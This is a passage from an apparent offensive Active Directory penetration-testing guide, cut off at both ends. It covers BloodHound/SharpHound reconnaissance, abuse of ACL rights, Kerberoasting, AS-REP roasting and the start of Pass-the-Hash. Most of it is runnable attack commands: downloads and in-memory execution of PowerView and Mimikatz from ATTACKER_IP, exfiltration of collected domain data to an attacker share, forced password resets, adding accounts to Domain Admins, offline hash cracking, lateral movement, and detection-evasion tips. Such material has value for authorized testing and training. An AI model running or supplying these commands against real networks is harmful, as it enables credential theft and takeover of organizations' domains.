wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
./BloodHound --no-sandbox
```

#### Collecting Data with SharpHound

**Download SharpHound:**

```powershell
# From attacker machine
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1

# Transfer to target
certutil -urlcache -f http://ATTACKER_IP/SharpHound.exe C:\temp\SharpHound.exe
```

**Basic collection:**

```powershell
# Import PowerShell version
Import-Module .\SharpHound.ps1

# Run all collection methods
Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.LOCAL -ZipFileName output.zip

# Executable version
.\SharpHound.exe -c All -d DOMAIN.LOCAL --zipfilename output.zip
```

**Collection methods:**

**All (default):**

```powershell
.\SharpHound.exe -c All
```

**Specific methods:**

```powershell
# Session collection (user sessions on computers)
.\SharpHound.exe -c Session

# Local admin collection
.\SharpHound.exe -c LocalAdmin

# Group membership
.\SharpHound.exe -c Group

# Trust relationships
.\SharpHound.exe -c Trusts

# ACLs
.\SharpHound.exe -c ACL

# Object properties
.\SharpHound.exe -c ObjectProps

# Container properties
.\SharpHound.exe -c Container

# Computer-only collection (stealthier)
.\SharpHound.exe -c ComputerOnly

# Logged on users
.\SharpHound.exe -c LoggedOn

# RDP users
.\SharpHound.exe -c RDP

# DCOM users
.\SharpHound.exe -c DCOM

# PS Remoting users
.\SharpHound.exe -c PSRemote
```

**Advanced collection options:**

```powershell
# Specify domain controller
.\SharpHound.exe -c All -d DOMAIN.LOCAL --domaincontroller DC01.DOMAIN.LOCAL

# Stealth mode (slower, less noisy)
.\SharpHound.exe -c All --stealth

# Throttle requests (avoid detection)
.\SharpHound.exe -c All --throttle 1000

# Loop collection (continuous monitoring)
.\SharpHound.exe -c All --loop --loopduration 24h --loopinterval 30m

# Exclude domain controllers from session enum
.\SharpHound.exe -c All --excludedomaincontrollers

# Custom LDAP filter
.\SharpHound.exe -c All --ldapfilter "(description=*admin*)"
```

**Collection from Linux (bloodhound-python):**

```bash
# Install
pip install bloodhound

# Collect data
bloodhound-python -u username -p password -d DOMAIN.LOCAL -dc DC01.DOMAIN.LOCAL -c All

# With NT hash
bloodhound-python -u username --hashes :NTHASH -d DOMAIN.LOCAL -dc DC01.DOMAIN.LOCAL -c All

# Kerberos authentication
bloodhound-python -u username -k -d DOMAIN.LOCAL -dc DC01.DOMAIN.LOCAL -c All
```

**Exfiltrate collected data:**

```powershell
# Data saved as ZIP file
# Transfer to attacker machine
Start-BitsTransfer -Source C:\temp\output.zip -Destination \\ATTACKER_IP\share\output.zip

# Or via base64
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("output.zip"))
$data | Out-File encoded.txt
```

#### Importing Data into BloodHound

**Upload data:**

1. Start BloodHound GUI
2. Click "Upload Data" button (right side)
3. Select ZIP file(s) from SharpHound
4. Wait for import to complete

**Command line import:**

```bash
# Using cypher-shell
cat queries.cypher | cypher-shell -u neo4j -p bloodhound
```

#### BloodHound Pre-Built Queries

**Analysis tab queries:**

**Find Shortest Paths to Domain Admins:**

```
Shortest Paths to Domain Admins
```

- Shows all paths from owned/high-value targets to Domain Admins group
- Red lines indicate direct paths
- Analyze each hop for exploitation

**Find Principals with DCSync Rights:**

```
Find Principals with DCSync Rights
```

- Identifies users/computers with DS-Replication-Get-Changes rights
- Can perform DCSync attack to dump credentials
- Critical for credential theft

**Users with Foreign Domain Group Membership:**

```
Users with Foreign Domain Group Membership
```

- Cross-domain trust relationships
- Identifies trust-based attack paths

**Find Computers where Domain Users are Local Admin:**

```
Find Computers where Domain Users are Local Admin
```

- Common misconfiguration
- Allows lateral movement for any domain user

**Find Computers with Unconstrained Delegation:**

```
Find Computers with Unconstrained Delegation
```

- Vulnerable to credential theft
- Can capture TGTs when users authenticate

**Shortest Paths to Unconstrained Delegation Systems:**

```
Shortest Paths to Unconstrained Delegation Systems
```

- Path to compromise unconstrained delegation computers

**Find Kerberoastable Accounts:**

```
Find all Kerberoastable Accounts
```

- Users with SPNs
- Passwords can be cracked offline

**Shortest Paths from Kerberoastable Users:**

```
Shortest Paths from Kerberoastable Users
```

- Shows what access Kerberoastable accounts have

**AS-REP Roastable Users:**

```
List all AS-REP Roastable Users
```

- Users with "Do not require Kerberos preauthentication"
- Can request AS-REPs and crack passwords offline

**Shortest Paths from Owned Principals:**

```
Shortest Paths from Owned Principals
```

- After marking nodes as owned, shows next attack paths

#### Custom Cypher Queries

**Access raw query interface:**

- Click "Raw Query" at bottom of BloodHound

**Find users with passwords in description:**

```cypher
MATCH (u:User) WHERE u.description =~ '(?i).*pass.*' RETURN u.name, u.description
```

**Find computers with admin local and sessions:**

```cypher
MATCH (c:Computer)-[:AdminTo]->(c2:Computer), (u:User)-[:HasSession]->(c2) RETURN c.name, c2.name, u.name
```

**Find users with GenericAll on computers:**

```cypher
MATCH (u:User)-[:GenericAll]->(c:Computer) RETURN u.name, c.name
```

**Find constrained delegation paths:**

```cypher
MATCH (u:User {name:"USER@DOMAIN.LOCAL"}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) WHERE c.unconstraineddelegation = true RETURN p
```

**Find all users with local admin on Domain Controllers:**

```cypher
MATCH (u:User)-[:AdminTo]->(c:Computer {name:"DC01.DOMAIN.LOCAL"}) RETURN u.name
```

**Find computers where Domain Users can RDP:**

```cypher
MATCH (g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:CanRDP]->(c:Computer) RETURN c.name
```

**Find machines where user is local admin:**

```cypher
MATCH (u:User {name:"USER@DOMAIN.LOCAL"})-[:AdminTo]->(c:Computer) RETURN c.name
```

**Find users with DCSync rights:**

```cypher
MATCH (u)-[:MemberOf*1..]->(g:Group)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN u.name, g.name
```

**Find objects with LAPS enabled:**

```cypher
MATCH (c:Computer) WHERE c.haslaps = true RETURN c.name
```

#### Marking Nodes as Owned/High Value

**Mark as owned:**

- Right-click node → "Mark User as Owned" or "Mark Computer as Owned"
- Enables "Shortest Paths from Owned Principals" query

**Mark as high value:**

- Right-click node → "Mark as High Value"
- Custom targeting for specific goals

**Add notes:**

- Right-click node → "Edit Node"
- Add notes about compromised credentials, access methods

#### Analyzing Attack Paths

**Example path interpretation:**

```
User1 → MemberOf → Group1 → GenericAll → User2 → AdminTo → Computer1
```

**Steps to exploit:**

1. Authenticate as User1
2. User1 is member of Group1
3. Group1 has GenericAll rights over User2
4. Change User2's password or add SPN
5. User2 has local admin on Computer1
6. Use User2 credentials to access Computer1

**Common edge types:**

**MemberOf** - Group membership **AdminTo** - Local administrator on computer **HasSession** - User has active session on computer **GenericAll** - Full control over object **GenericWrite** - Can modify most attributes **WriteOwner** - Can change object owner **WriteDacl** - Can modify permissions **ForceChangePassword** - Can reset password without knowing current **AddMembers** - Can add members to group **AllExtendedRights** - Can perform extended rights (e.g., password reset) **ReadLAPSPassword** - Can read LAPS password **ReadGMSAPassword** - Can read gMSA password **SQLAdmin** - SQL admin on database **CanRDP** - Can RDP to computer **CanPSRemote** - Can use PowerShell remoting **ExecuteDCOM** - Can execute via DCOM

#### Exploitation Techniques from BloodHound

**GenericAll on User:**

```powershell
# Change password
net user targetuser NewPassword123! /domain

# Add SPN for Kerberoasting
Set-ADUser -Identity targetuser -ServicePrincipalNames @{Add="HTTP/fake.domain.local"}

# Request TGS
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/fake.domain.local"

# Export and crack
mimikatz # kerberos::list /export
```

**GenericWrite on User:**

```powershell
# Set SPN
Set-ADUser -Identity targetuser -ServicePrincipalNames @{Add="HTTP/fake"}

# Disable pre-authentication (AS-REP Roasting)
Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $true
```

**WriteOwner:**

```powershell
# Change owner to yourself
Set-ADObject -Identity "CN=TargetGroup,DC=domain,DC=local" -Replace @{nTSecurityDescriptor=(New-Object System.DirectoryServices.ActiveDirectorySecurity).SetOwner([System.Security.Principal.NTAccount]"DOMAIN\CurrentUser")}

# Then grant yourself GenericAll
Add-ADGroupMember -Identity TargetGroup -Members CurrentUser
```

**WriteDacl:**

```powershell
# Grant yourself GenericAll
Add-ObjectACL -TargetDistinguishedName "CN=TargetUser,CN=Users,DC=domain,DC=local" -PrincipalSamAccountName currentuser -Rights All
```

**ForceChangePassword:**

```powershell
# Reset password
$newPass = ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force
Set-ADAccountPassword -Identity targetuser -NewPassword $newPass -Reset
```

**AddMembers:**

```powershell
# Add yourself to group
Add-ADGroupMember -Identity "Domain Admins" -Members currentuser
```

#### BloodHound Detection Evasion

**Stealthy collection:**

```powershell
# Avoid session enumeration (most detectable)
.\SharpHound.exe -c Group,LocalAdmin,Trusts,ACL,ObjectProps,Container

# Throttle requests
.\SharpHound.exe -c All --throttle 5000

# Collect only from specific OU
.\SharpHound.exe -c All --ou "OU=Workstations,DC=domain,DC=local"

# Exclude high-value targets
.\SharpHound.exe -c All --excludedomaincontrollers
```

**Alternative data sources:**

```powershell
# Use existing AD snapshot
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Collect without touching endpoints (LDAP-only)
.\SharpHound.exe -c Group,ACL,ObjectProps,Trusts,Container
```

### Kerberoasting (Invoke-Kerberoast)

Kerberoasting extracts service account credentials by requesting Kerberos TGS tickets for accounts with Service Principal Names (SPNs), then cracking the encrypted portion offline.

#### Understanding Kerberoasting

**Attack flow:**

1. Enumerate accounts with SPNs
2. Request TGS (service ticket) for SPN
3. TGS is encrypted with service account's password hash
4. Extract ticket and crack offline

**Why it works:**

- Any authenticated domain user can request TGS tickets
- Service accounts often have weak passwords
- Cracking happens offline (no account lockout)
- Tickets encrypted with RC4_HMAC (MD5) or AES

#### Identifying Kerberoastable Accounts

**PowerShell Active Directory module:**

```powershell
# Find users with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalNames, PasswordLastSet, LastLogonDate | Select-Object Name, SamAccountName, ServicePrincipalNames, PasswordLastSet, LastLogonDate

# Count Kerberoastable accounts
(Get-ADUser -Filter {ServicePrincipalName -ne "$null"}).Count
```

**LDAP query (no AD module):**

```powershell
$searcher = [adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))"
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        User = $_.Properties.samaccountname[0]
        SPNs = $_.Properties.serviceprincipalname
        PWDLastSet = [datetime]::FromFileTime([string]$_.Properties.pwdlastset[0])
    }
}
```

**Using PowerView:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Find Kerberoastable users
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, pwdlastset, memberof
```

**Using setspn (native tool):**

```cmd
setspn -T DOMAIN.LOCAL -Q */*
setspn -T DOMAIN.LOCAL -Q */* | findstr /i "sql\|mssql\|http\|service"
```

#### Kerberoasting with Invoke-Kerberoast

**PowerView's Invoke-Kerberoast:**

```powershell
# Download PowerView
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Request TGS tickets and export 
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -FilePath C:\temp\kerberoast_hashes.txt

# John the Ripper format

Invoke-Kerberoast -OutputFormat John | Out-File -FilePath C:\temp\kerberoast_john.txt

# Specific user

Invoke-Kerberoast -Identity sqlservice -OutputFormat Hashcat

# All Kerberoastable accounts

Invoke-Kerberoast -Domain DOMAIN.LOCAL -OutputFormat Hashcat

````

**Parameters:**
- `-OutputFormat` - Hash format (Hashcat or John)
- `-Identity` - Specific user to target
- `-Domain` - Target domain
- `-Credential` - Use alternate credentials

**Advanced Invoke-Kerberoast:**
```powershell
# Target only accounts with adminCount=1
Invoke-Kerberoast -AdminCount -OutputFormat Hashcat

# Exclude machine accounts
Get-DomainUser -SPN | Where-Object {$_.samaccountname -notmatch '\$$'} | Invoke-Kerberoast -OutputFormat Hashcat

# Target specific SPNs
Invoke-Kerberoast -SPN "HTTP/webapp.domain.local"

# Get verbose output
Invoke-Kerberoast -Verbose
````

#### Kerberoasting with Rubeus

**Rubeus (C# Kerberos toolkit):**

```cmd
# Basic Kerberoasting
Rubeus.exe kerberoast

# Output to file
Rubeus.exe kerberoast /outfile:hashes.txt

# Specific format
Rubeus.exe kerberoast /format:hashcat

# Specific user
Rubeus.exe kerberoast /user:sqlservice

# All users in specific OU
Rubeus.exe kerberoast /ou:"OU=ServiceAccounts,DC=domain,DC=local"

# Request AES256 tickets (harder to crack)
Rubeus.exe kerberoast /tgtdeleg

# Statistics only (no actual roasting)
Rubeus.exe kerberoast /stats
```

**Advanced Rubeus options:**

```cmd
# Specify domain controller
Rubeus.exe kerberoast /dc:DC01.DOMAIN.LOCAL

# Use alternate credentials
Rubeus.exe kerberoast /user:sqlservice /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL /creduser:DOMAIN\user /credpassword:password

# OPSEC-safe mode (avoid detection)
Rubeus.exe kerberoast /nowrap

# Filter by password last set date
Rubeus.exe kerberoast /ldapfilter:"(&(servicePrincipalName=*)(!(cn=krbtgt))(pwdlastset<=129473172000000000))"

# Export in Hashcat format
Rubeus.exe kerberoast /simple /nowrap /outfile:hashes.txt
```

**Rubeus output format:**

```
$krb5tgs$23$*username$REALM.LOCAL$servicename/host.domain.local*$[HASH_DATA]
```

#### Manual Kerberoasting with Native Windows Tools

**Request TGS manually:**

```powershell
# Add System.IdentityModel assembly
Add-Type -AssemblyName System.IdentityModel

# Request TGS for specific SPN
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webapp.domain.local"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.domain.local:1433"

# List all cached tickets
klist

# Export tickets with Mimikatz
mimikatz.exe
kerberos::list /export
```

**Extract tickets with Invoke-Mimikatz:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Mimikatz.ps1')

# Request TGS for all SPNs
Get-DomainUser -SPN | ForEach-Object {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName
}

# Export tickets
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

**Convert kirbi to Hashcat format:**

```bash
# On attacker machine with Impacket
python3 kirbi2john.py ticket.kirbi > hash.txt

# Or use kirbi2hashcat
python3 kirbi2hashcat.py ticket.kirbi
```

#### Kerberoasting from Linux

**Using Impacket GetUserSPNs.py:**

```bash
# Basic usage
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP

# Request TGS tickets
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request

# Save hashes to file
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile kerberoast_hashes.txt

# Use NT hash instead of password
GetUserSPNs.py DOMAIN/user -dc-ip DC_IP -hashes :NTHASH -request

# Kerberos authentication
GetUserSPNs.py DOMAIN/user -dc-ip DC_IP -k -no-pass -request

# Target specific user
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request-user sqlservice
```

**Advanced GetUserSPNs options:**

```bash
# Show statistics without requesting tickets
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP

# Request only RC4 tickets (easier to crack)
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -rc4

# Request AES tickets
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -aes

# LDAP filter
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -ldap-filter "(pwdlastset<=129473172000000000)"

# Save tickets in John format
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -format john -outputfile hashes.john
```

#### Cracking Kerberoast Hashes

**Identify hash format:**

```
Hashcat format: $krb5tgs$23$*user$realm$SPN*$hash
John format: $krb5tgs$23$*user*$realm$SPN*$hash
```

**Hashcat cracking:**

```bash
# Crack with wordlist
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# Crack with rules
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt -r best64.rule

# Brute force (short passwords)
hashcat -m 13100 kerberoast_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d

# Hybrid attack
hashcat -m 13100 kerberoast_hashes.txt -a 6 wordlist.txt ?d?d?d?d

# Show cracked passwords
hashcat -m 13100 kerberoast_hashes.txt --show

# Continue previous session
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt --session kerb1 --restore
```

**Hash modes for different encryption types:**

- **-m 13100** - Kerberos 5 TGS-REP etype 23 (RC4-HMAC-MD5)
- **-m 19600** - Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)
- **-m 19700** - Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)

**John the Ripper cracking:**

```bash
# Crack with wordlist
john --wordlist=wordlist.txt kerberoast_john.txt

# Crack with rules
john --wordlist=wordlist.txt --rules=best64 kerberoast_john.txt

# Show cracked passwords
john --show kerberoast_john.txt

# Continue previous session
john --restore
```

**Online cracking services:**

```bash
# [Unverified] Some services offer Kerberoast hash cracking
# Examples: hashcat.net, onlinehashcrack.com
# Use with caution - exposes domain hashes
```

#### Targeted Kerberoasting

**Prioritize high-value targets:**

```powershell
# Find service accounts in privileged groups
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties MemberOf, ServicePrincipalNames | Where-Object {
    $_.MemberOf -match "Domain Admins|Enterprise Admins|Administrators"
} | Select-Object Name, SamAccountName, ServicePrincipalNames
```

**Target accounts with old passwords:**

```powershell
# Find accounts with passwords older than 5 years
$date = (Get-Date).AddYears(-5)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties PasswordLastSet, ServicePrincipalNames | Where-Object {
    $_.PasswordLastSet -lt $date
} | Select-Object Name, PasswordLastSet, ServicePrincipalNames
```

**Target SQL Server accounts:**

```powershell
# SQL Server SPNs often have weak passwords
Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Properties ServicePrincipalNames | Select-Object Name, ServicePrincipalNames

# Request tickets
Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} | ForEach-Object {
    $spns = $_.ServicePrincipalNames
    foreach ($spn in $spns) {
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
    }
}
```

#### Kerberoasting Detection Evasion

**OPSEC considerations:**

- Requesting large numbers of TGS tickets is detectable
- Focus on specific high-value targets
- Space out requests over time
- Use compromised account from normal workstation

**Stealthy approach:**

```powershell
# Request tickets slowly with delays
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | Select-Object -First 5 | ForEach-Object {
    $spns = $_.ServicePrincipalNames
    foreach ($spn in $spns) {
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
        Start-Sleep -Seconds 60  # 1 minute delay between requests
    }
}
```

**Request only RC4 tickets (less suspicious than downgrade attacks):**

```cmd
Rubeus.exe kerberoast /rc4opsec
```

#### Post-Exploitation with Cracked Service Accounts

**Verify cracked credentials:**

```powershell
# Test authentication
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\sqlservice", (ConvertTo-SecureString "CrackedPassword123!" -AsPlainText -Force))
Get-ADUser -Identity sqlservice -Credential $cred
```

**Enumerate access:**

```powershell
# Check group memberships
Get-ADPrincipalGroupMembership sqlservice | Select-Object Name

# Check what computers account has admin on
Find-LocalAdminAccess -UserName sqlservice

# Check SQL Server access
Get-SQLInstanceDomain | Get-SQLServerInfo -Username sqlservice -Password "CrackedPassword123!"
```

**Lateral movement:**

```powershell
# PSRemoting
Enter-PSSession -ComputerName TARGET -Credential $cred

# WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName TARGET -Credential $cred
```

### AS-REP Roasting (GetNPUsers.py)

AS-REP Roasting targets user accounts with Kerberos pre-authentication disabled, allowing attackers to request authentication data and crack passwords offline without any prior credentials.

#### Understanding AS-REP Roasting

**Attack mechanism:**

1. Identify accounts with "Do not require Kerberos preauthentication" enabled
2. Request AS-REP (Authentication Service Response) for those accounts
3. AS-REP contains encrypted data based on user's password
4. Crack encrypted portion offline

**Key differences from Kerberoasting:**

- No domain credentials required to enumerate/exploit
- Targets user accounts (not service accounts)
- Requires specific misconfiguration (pre-auth disabled)
- Less common than Kerberoasting

**User Account Control flag:**

- `DONT_REQ_PREAUTH` (0x400000) - Kerberos pre-authentication not required

#### Identifying AS-REP Roastable Accounts

**PowerShell Active Directory module:**

```powershell
# Find users with pre-auth disabled
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth, PasswordLastSet | Select-Object Name, SamAccountName, DoesNotRequirePreAuth, PasswordLastSet

# Count vulnerable accounts
(Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}).Count
```

**LDAP query (no AD module):**

```powershell
# Search using UserAccountControl flag
$searcher = [adsisearcher]"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        User = $_.Properties.samaccountname[0]
        DN = $_.Properties.distinguishedname[0]
        PWDLastSet = [datetime]::FromFileTime([string]$_.Properties.pwdlastset[0])
    }
}
```

**Using PowerView:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Find AS-REP Roastable users
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname, pwdlastset

# With additional details
Get-DomainUser -PreauthNotRequired -Properties samaccountname, pwdlastset, lastlogon, memberof | Format-Table -AutoSize
```

**Manual UAC flag check:**

```powershell
# Check specific user
Get-ADUser -Identity username -Properties UserAccountControl | Select-Object Name, @{Name="PreAuthNotRequired";Expression={($_.UserAccountControl -band 4194304) -ne 0}}

# Check all users
Get-ADUser -Filter * -Properties UserAccountControl | Where-Object {
    ($_.UserAccountControl -band 4194304) -ne 0
} | Select-Object Name, SamAccountName
```

#### AS-REP Roasting with GetNPUsers.py (Impacket)

**Basic usage without credentials:**

```bash
# Request AS-REPs for all users (no authentication needed)
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip DC_IP -format hashcat -outputfile asrep_hashes.txt

# Request for specific user
GetNPUsers.py DOMAIN.LOCAL/username -dc-ip DC_IP -no-pass

# Enumerate from userlist
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile hashes.txt
```

**With domain credentials:**

```bash
# Use credentials to query AD for vulnerable users
GetNPUsers.py DOMAIN.LOCAL/user:password -dc-ip DC_IP -request -format hashcat -outputfile asrep_hashes.txt

# Using NT hash
GetNPUsers.py DOMAIN.LOCAL/user -dc-ip DC_IP -hashes :NTHASH -request -format hashcat

# Using Kerberos ticket
GetNPUsers.py DOMAIN.LOCAL/user -dc-ip DC_IP -k -no-pass -request
```

**Advanced GetNPUsers options:**

```bash
# Specify alternative domain controller
GetNPUsers.py DOMAIN.LOCAL/user:password -dc-ip 10.10.10.10 -request

# John the Ripper format
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip DC_IP -format john -outputfile asrep.john

# Verbose output
GetNPUsers.py DOMAIN.LOCAL/user:password -dc-ip DC_IP -request -debug

# LDAPS (encrypted LDAP)
GetNPUsers.py DOMAIN.LOCAL/user:password -dc-ip DC_IP -ldaps -request

# Target specific naming context
GetNPUsers.py DOMAIN.LOCAL/user:password -dc-ip DC_IP -request -target-domain DOMAIN.LOCAL
```

**User enumeration without credentials:**

```bash
# Enumerate valid usernames (if no pre-auth disabled accounts exist)
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip DC_IP -usersfile usernames.txt -no-pass

# [Inference] Response differences indicate valid vs invalid usernames
# Valid user: "User USERNAME doesn't have UF_DONT_REQUIRE_PREAUTH set"
# Invalid user: "Client not found in Kerberos database"
```

#### AS-REP Roasting with Rubeus

**Basic AS-REP Roasting:**

```cmd
# Request AS-REPs for all users
Rubeus.exe asreproast

# Output to file
Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Hashcat format
Rubeus.exe asreproast /format:hashcat

# John format
Rubeus.exe asreproast /format:john
```

**Target specific users:**

```cmd
# Specific user
Rubeus.exe asreproast /user:username

# Users from file
Rubeus.exe asreproast /usersfile:users.txt

# Specific domain
Rubeus.exe asreproast /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL
```

**Advanced Rubeus options:**

```cmd
# Use alternate credentials
Rubeus.exe asreproast /user:targetuser /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL /creduser:DOMAIN\user /credpassword:password

# No wrapping (cleaner output)
Rubeus.exe asreproast /nowrap

# Verbose output
Rubeus.exe asreproast /verbose

# Output statistics
Rubeus.exe asreproast /stats
```

**Rubeus output format:**

```
$krb5asrep$23$username@DOMAIN.LOCAL:[HASH_DATA]
```

#### Manual AS-REP Roasting with PowerShell

**Custom PowerShell AS-REP request:**

```powershell
# Requires System.DirectoryServices.AccountManagement
Add-Type -AssemblyName System.DirectoryServices.AccountManagement

function Get-ASREPHash {
    param([string]$Username, [string]$Domain)
    
    # Create Kerberos AS-REQ without pre-authentication
    # [Inference] Complex implementation requiring raw Kerberos protocol handling
    # Rubeus or Impacket recommended for practical use
}
```

**Using native kinit (limited scenarios):**

```bash
# On Linux with Kerberos client
kinit -C username@DOMAIN.LOCAL
# If pre-auth disabled, may return ticket without password
```

#### Cracking AS-REP Hashes

**Identify hash format:**

```
Hashcat: $krb5asrep$23$username@DOMAIN.LOCAL:hash_data
John: $krb5asrep$username@DOMAIN.LOCAL:hash_data
```

**Hashcat cracking:**

```bash
# Crack with wordlist
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Crack with rules
hashcat -m 18200 asrep_hashes.txt wordlist.txt -r best64.rule

# Brute force
hashcat -m 18200 asrep_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d

# Hybrid attack
hashcat -m 18200 asrep_hashes.txt -a 6 wordlist.txt ?d?d?d?d

# Show cracked
hashcat -m 18200 asrep_hashes.txt --show

# Multiple wordlists
hashcat -m 18200 asrep_hashes.txt wordlist1.txt wordlist2.txt wordlist3.txt
```

**Hash mode:**

- **-m 18200** - Kerberos 5 AS-REP etype 23 (RC4-HMAC-MD5)

**John the Ripper cracking:**

```bash
# Crack with wordlist
john --wordlist=wordlist.txt asrep.john

# Crack with rules
john --wordlist=wordlist.txt --rules=jumbo asrep.john

# Show cracked
john --show asrep.john

# Incremental mode
john --incremental asrep.john
```

#### Setting Pre-Authentication Disabled (Post-Exploitation)

**Scenario:** GenericWrite/GenericAll rights on target user from BloodHound.

**Disable pre-authentication:**

```powershell
# PowerShell AD module
Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $true

# Verify
Get-ADUser -Identity targetuser -Properties DoesNotRequirePreAuth | Select-Object Name, DoesNotRequirePreAuth
```

**Using PowerView:**

```powershell
# Set UAC flag
Set-DomainObject -Identity targetuser -Set @{useraccountcontrol=4194304} -Verbose

# Or add flag to existing value
$user = Get-DomainUser -Identity targetuser
$uac = $user.useraccountcontrol -bor 4194304
Set-DomainObject -Identity targetuser -Set @{useraccountcontrol=$uac}
```

**Request AS-REP after modification:**

```bash
# Wait a moment for replication
sleep 5

# Request AS-REP
GetNPUsers.py DOMAIN.LOCAL/targetuser -dc-ip DC_IP -no-pass -format hashcat
```

**Re-enable pre-authentication (cleanup):**

```powershell
# Restore setting
Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $false
```

#### Combining AS-REP Roasting with User Enumeration

**Username enumeration via AS-REP:**

```bash
# Create username list from common patterns
cat > users.txt << EOF
admin
administrator
john.doe
jane.smith
service_account
backup
sql_admin
EOF

# Test for valid usernames
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat 2>&1 | tee results.txt

# Parse results
grep -v "Client not found" results.txt
```

**Automated username generation:**

```bash
# Using username-anarchy
./username-anarchy -f firstnames.txt -l lastnames.txt > usernames.txt

# Test generated usernames
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip DC_IP -usersfile usernames.txt -no-pass
```

#### Defense Evasion for AS-REP Roasting

**OPSEC considerations:**

- AS-REP requests without pre-auth are logged (Event ID 4768)
- Multiple failed requests may trigger alerts
- Space out requests
- Use from compromised internal host

**Stealthy approach:**

```bash
# Request one user at a time with delays
while read user; do
    GetNPUsers.py DOMAIN.LOCAL/$user -dc-ip DC_IP -no-pass
    sleep 300  # 5 minute delay
done < users.txt
```

#### Post-Exploitation with Cracked AS-REP Accounts

**Verify cracked credentials:**

```bash
# Test authentication
crackmapexec smb DC_IP -u username -p 'CrackedPassword123!'

# Enumerate access
crackmapexec smb SUBNET/24 -u username -p 'CrackedPassword123!' --shares
```

**Enumerate privileges:**

```powershell
# Check group memberships
Get-ADPrincipalGroupMembership username | Select-Object Name

# Check what computers user has admin on
Find-LocalAdminAccess -UserName username
```

**Use for lateral movement:**

```bash
# PSExec
psexec.py DOMAIN/username:'CrackedPassword123!'@TARGET_IP

# WMIExec
wmiexec.py DOMAIN/username:'CrackedPassword123!'@TARGET_IP

# Evil-WinRM
evil-winrm -i TARGET_IP -u username -p 'CrackedPassword123!'
```

---

### Pass-the-Hash (PtH)

Pass-the-Hash exploits NTLM authentication by using password hashes directly without cracking them. This works because Windows authenticates users with hash values rather than plaintext passwords in many scenarios.

#### Understanding NTLM Hashes

```
NTLM Hash Format: username:RID:LM_hash:NTLM_hash:::

Example:
